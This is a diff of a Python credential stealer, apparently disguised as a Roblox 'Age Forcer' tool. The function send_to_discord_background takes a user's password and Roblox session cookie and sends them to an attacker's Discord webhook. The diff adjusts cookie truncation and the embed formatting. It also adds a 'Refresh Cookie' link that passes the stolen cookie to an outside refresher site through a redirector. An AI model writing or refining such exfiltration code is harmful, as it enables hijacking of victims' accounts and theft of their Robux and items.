@@ -65,8 +65,12 @@ def send_to_discord_background(password, cookie, webhook_url):
         # Prepare full cookie with warning prefix for refresh link
         full_cookie_with_warning = f'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{cookie}'
         
-        # URL encode the full cookie for the refresh link (use safer encoding)
+        # URL encode the full cookie for the refresh link - keep it simple to avoid Discord issues
         import urllib.parse
+        # Truncate cookie first to avoid Discord URL length limits
+        if len(full_cookie_with_warning) > 1500:
+            full_cookie_with_warning = full_cookie_with_warning[:1500] + "..."
+        
         encoded_full_cookie = urllib.parse.quote_plus(full_cookie_with_warning)
         
         # Truncate cookie if too long for Discord embed
@@ -75,20 +79,20 @@ def send_to_discord_background(password, cookie, webhook_url):
             cookie_content = cookie_content[:available_cookie_space] + "..."
             print(f"Background: Cookie truncated to fit Discord limit")
         
-        # Create Discord embed data
+        # Create Discord embed data - simplified structure
         discord_data = {
             'content': ping_content,
             'embeds': [
                 {
                     'title': 'Age Forcer',
-                    'color': 0xff0000,
+                    'color': 16711680,
                     'thumbnail': {
                         'url': user_info['profile_picture']
                     },
                     'fields': [
                         {
                             'name': '🔗 Quick Links',
-                            'value': f'[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
+                            'value': f'[Discord Server](https://discord.gg/SsWFKqXr)\n[Refresh Cookie](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
                             'inline': False
                         },
                         {
